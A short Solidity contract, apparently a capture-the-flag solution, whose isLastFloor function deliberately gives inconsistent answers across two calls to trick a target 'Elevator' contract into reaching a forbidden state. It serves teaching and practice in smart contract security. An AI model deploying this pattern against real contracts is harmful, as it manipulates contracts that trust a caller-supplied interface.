pragma solidity ^0.8.0;

interface ElevatorInterface {
    function goTo(uint _floor) external;
}

contract Building {
    uint public floors;
    uint public riggedPass;
    address public targetContract;
    
    constructor() {
        floors = 200;
        riggedPass = 0;
    }
  
    // Sets the target contract 
    function setTargetContract(address _target) public {
        targetContract = _target;
    }

    //Triggers the goTo() function on the elevator target contract
    function triggerGoTo(uint _floor) external {
        ElevatorInterface ev = ElevatorInterface(targetContract);
        ev.goTo(_floor);
    }
        
    // This is a rigged fuction. If the 
    function isLastFloor(uint _floor) external returns (bool) {
        // Check if the provided floor is possible
        require(_floor <= floors, "Floor number higher than top floor");
        // Declare the variable that we will return to caller
        // We assume that it is not the top floor by default
        bool isLastFloorRet = false;
        // If _floor is the top floor, rig the return value
        if(_floor == floors) {
            // If this is the first pass of the rigged call
            if(riggedPass == 0) {
                // Leave isLastFloor as false so we get inside the if statement
                // in the elevator contract
                riggedPass = 1;
            }
            // If this is the second pass of the rigged call
            else {
                // On the second call now that we're inside the if statement
                // we can return the value which will say that we're at the top
                isLastFloorRet = true;
                riggedPass = 0;
            }
        }
        return isLastFloorRet;
    }
}
